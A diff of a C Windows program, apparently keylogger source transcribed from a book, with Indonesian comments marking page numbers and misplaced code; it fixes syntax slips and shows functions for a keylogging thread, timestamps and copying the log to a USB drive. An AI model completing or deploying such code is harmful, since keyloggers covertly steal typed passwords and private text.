@@ -96,9 +96,13 @@ LRESULT CALLBACK WindowsProcedure (HWND hwnd, UINT message,
             CopyToUFD();
             break;
         }
-        default
+       default:
           return DefWindowProc (hwnd, messagem wParam, lParam);
     }
+   // ini aslinya belum disalin
+   return 0;
+}
+
 DWORD WINAPI Keylog_Thread(LPVOID Param)
 {
     FILE *file;
@@ -275,6 +279,8 @@ DWORD WINAPI Keylog_Thread(LPVOID Param)
     }
     return EXIT_SUCCESS;
 }
+
+// halaman 46
 char* DateTime_Now(viod)
 {
     time_t now;
@@ -314,6 +320,8 @@ char* DateTime_Now(viod)
     return szReturn;
 
 }
+
+// halaman 47
 void CopyToUFD(void)
 {
     char szLog[MAX_PATH];
@@ -338,6 +346,8 @@ void CopyToUFD(void)
         }
     }
 }
+
+// halaman 49
 void InvokeLogFile(void)
 {
     char szLog[MAX_PATH];
@@ -348,6 +358,10 @@ void InvokeLogFile(void)
 
     ShellExecute(NULL, "open", szLog, NULL, NULL, SW_SHOW);
 }
+
+/* --------------------------------------------
     return 0;
 }
+    ini yang salah posisi
+   -------------------------------------------- */
 
